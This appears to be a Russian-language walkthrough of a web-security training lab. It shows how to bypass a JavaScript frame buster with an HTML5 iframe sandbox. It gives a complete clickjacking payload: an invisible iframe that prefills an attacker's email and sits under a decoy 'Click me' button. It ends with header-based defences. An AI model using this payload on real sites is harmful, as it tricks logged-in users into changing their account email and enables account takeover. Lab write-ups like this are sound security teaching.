<a id="goal"></a>

## 🎯 Цель

Использовать техники UI redressing для:

```text
1. Обхода клиентского защитного скрипта (frame buster) целевого приложения.
2. Предварительного заполнения поля "Email" с помощью GET-параметра в URL.
3. Создания HTML-страницы, которая безопасно встраивает страницу настроек, не вызывая принудительного редиректа.
4. Обмана авторизованного пользователя для нажатия на кнопку-приманку («Click me»).
5. Принуждения пользователя незаметно нажать скрытую кнопку «Update email».
```

<a id="theory"></a>

## 🧠 Краткая теория
До повсеместного внедрения стандартных HTTP-заголовков (`X-Frame-Options` и `Content-Security-Policy`) разработчики пытались защититься от кликджекинга с помощью JavaScript. Эти скрипты, известные как **frame busters** (разрушители фреймов), обычно проверяют, является ли текущее окно самым верхним в браузере. Если это не так, скрипт заставляет главное окно браузера перейти по URL-адресу встроенной страницы, фактически «вырываясь» из iframe.

Однако клиентские средства защиты фундаментально уязвимы, поскольку злоумышленник контролирует среду (родительское окно), в которой выполняется целевое приложение.

<a id="idea"></a>

## 🧩 Ключевая идея
Злоумышленник использует атрибут `sandbox` стандарта HTML5 для тега `iframe`, чтобы ограничить возможности встроенного приложения. Выборочно предоставляя разрешения, атакующий может разрешить отправку формы, одновременно блокируя JavaScript-защите возможность выполнить маневр побега.

```text
Сайт атакующего:    Встраивает цель в iframe с песочницей.
Ограничения Sandbox: Разрешают отправку форм, но запрещают редирект главного окна.
JS целевого сайта:  Пытается перенаправить главное окно, но браузер блокирует это действие.
Клик жертвы:        Браузер отправляет POST-запрос с предварительно заполненным email.
Целевой сервер:     Обновляет email-адрес жертвы ✅
```

<a id="framebuster"></a>

## 📡 Что такое Frame Buster скрипт?
Типичный защитный скрипт выглядит примерно так:
```javascript
if (top != self) {
    top.location = self.location;
}
```
Если вредоносный сайт пытается встроить эту страницу, скрипт обнаруживает, что объект `top` (главное окно браузера) не равен `self` (встроенному окну). Затем он перезаписывает URL главного окна, разрушая оверлей кликджекинга атакующего.

<a id="iframe"></a>

## ⚡ Техника обхода через HTML5 Sandbox
Атрибут `sandbox` применяет строгий набор ограничений к iframe.

```html
<iframe sandbox="allow-forms" src="..."></iframe>
```
Путем явного указания `sandbox="allow-forms"`:
1. `allow-forms` позволяет жертве отправить форму «Update email».
2. *Отсутствие* `allow-scripts` полностью отключает выполнение JavaScript (нейтрализуя скрипт).
3. *Отсутствие* `allow-top-navigation` запрещает любому скрипту перенаправлять родительское окно.

<a id="step1"></a>

## 🔍 Шаг 1 — Наблюдение за защитой в действии
Авторизуйтесь в уязвимом приложении (`wiener:peter`).

Перейдите на Exploit Server и попробуйте встроить страницу *без* атрибута sandbox:
```html
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```
Нажмите **Store** и **View exploit**. Вы заметите, что Exploit Server мгновенно исчезнет, и вас перенаправит на страницу аккаунта целевого сайта. Это подтверждает, что frame buster активен.

<a id="step2"></a>

## 🔍 Шаг 2 — Создание базового пейлоада с песочницей
В секцию Body на Exploit Server вставьте структуру HTML. Критически важно: добавьте `sandbox="allow-forms"` к iframe и включите параметр предзаполнения.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:385px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms" src="https://LAB-ID.web-security-academy.net/my-account?email=hacker@test.com"></iframe>
```

<a id="step3"></a>

## 🔍 Шаг 3 — Калибровка элемента-приманки
Установите `opacity` у iframe на `0.1`.

Нажмите **Store**, а затем **View exploit**. Обратите внимание, что страница больше не перенаправляется! Песочница успешно нейтрализовала frame buster.

Корректируйте значения пикселей `top` и `left` у `div`, пока надпись «Test me» не окажется идеально отцентрированной под кнопкой **«Update email»**.

*Осторожно: не нажимайте саму кнопку во время тестирования.*

<a id="step4"></a>

## 🔍 Шаг 4 — Сокрытие целевого фрейма
Когда выравнивание станет идеальным, подготовьте финальную версию пейлоада:

- Измените текст приманки с «Test me» на «Click me».
- Измените прозрачность iframe с `0.1` на `0.0001`.
- Измените email в URL `src` на абсолютно новый, уникальный адрес (например, `sandboxed_pwn@attacker.com`).

<a id="step5"></a>

## 🔍 Шаг 5 — Отправка эксплойта жертве
Нажмите **Store**, чтобы сохранить финальный невидимый пейлоад.

Нажмите **Deliver exploit to victim**.

Браузер жертвы загрузит эксплойт, заблокирует выполнение защитного скрипта и успешно перехватит клик жертвы по скрытой форме.

<a id="breakdown"></a>

## 🔬 Почему атака сработала
1. Клиентские средства защиты уязвимы
Цель полагалась на JavaScript для защиты от встраивания.

2. Ограничения песочницы HTML5
Атрибут `sandbox` предоставил злоумышленнику гранулярный контроль над возможностями фрейма. Не предоставив `allow-top-navigation` и `allow-scripts`, браузер активно защищал эксплойт злоумышленника от защитного скрипта цели.

3. Легитимный контекст сессии
Поскольку iframe по-прежнему загружается в контексте браузера жертвы (несмотря на песочницу), файлы cookie и CSRF-токены функционировали нормально, авторизуя отправку формы.

<a id="pentester"></a>

## 🧠 Как думать как пентестер
При аудите веб-приложений на сложные формы кликджекинга:

```text
Если сайт отказывается загружаться во фрейме и перенаправляет главное окно, использует ли он правильные HTTP-заголовки или только JavaScript?
Могу ли я обойти JS-защиту, используя `sandbox="allow-forms"`?
Сломается ли сайт полностью, если исключить `allow-scripts`, или базовая HTML-форма всё ещё будет работать?
```

<a id="mistakes"></a>

## ❌ Типичные ошибки
Ошибка 1. Добавление `allow-top-navigation`
Если вы добавите `allow-top-navigation` в атрибут sandbox, вы снова включите способность защитного скрипта перенаправлять страницу, и ваш эксплойт самоуничтожится при загрузке.

Ошибка 2. Ненужное добавление `allow-scripts`
Если целевая форма полагается исключительно на стандартный HTML `<form action="..." method="POST">`, вам не нужен `allow-scripts`. Его включение может позволить защитному скрипту выполнить альтернативные контрмеры.

<a id="defense"></a>

## 🛡 Защита
1. Отказ от JavaScript Frame Busters
Клиентские скрипты не являются надежным механизмом обеспечения безопасности против встраивания. Их можно тривиально обойти с помощью стандартных функций браузера.

2. Применение HTTP-заголовков (Основная защита)
Реализуйте надежную серверную защиту с использованием современных HTTP-заголовков. Браузер применяет их *до* рендеринга DOM или обработки атрибутов песочницы:
- `Content-Security-Policy: frame-ancestors 'none';` (Рекомендуемый современный подход)
- `X-Frame-Options: DENY` или `SAMEORIGIN` (Поддержка старых систем)
